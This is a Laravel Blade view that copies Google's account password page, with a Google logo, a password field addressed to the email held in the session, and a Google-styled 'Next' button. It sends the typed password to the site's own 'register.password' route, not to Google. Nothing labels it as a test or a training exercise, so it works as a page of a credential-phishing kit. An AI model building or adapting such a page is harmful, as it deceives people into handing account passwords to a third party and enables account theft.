<x-guest-layout>
    <!-- Session Status -->
    <x-auth-session-status class="mb-4" :status="session('status')" />
    @section('title')
        {{__('Enter your Google account password')}}
    @endsection
    <div class="flex items-center justify-center mt-4" style="width: 150px;height: 30px;">
        <img  src="{{config('app.google-logo')}}" alt="Google" width="100%" height="100%"/>
    </div>
{{--    <h2 class="flex items-center justify-start mt-4">password for: </h2>--}}
    <br/>
    <form method="POST" action="{{route('register.password')}}">
        @csrf
                <div class="mt-4">
                    <x-input-label for="password" :value="__('Enter password for: '.session('email'))" />
                    <x-text-input id="password" class="block mt-1 w-full"
                                    type="password"
                                    name="password"
                                    required autocomplete="password" />
                </div>
        <div class="flex items-center justify-end mt-4">
            <button class="ml-3" style="width: 120px;height: 30px;color: #fff;background-color: #1a73e8;border-radius: 5px;">
                {{ __('Next') }}
            </button>
        </div>
    </form>
</x-guest-layout>
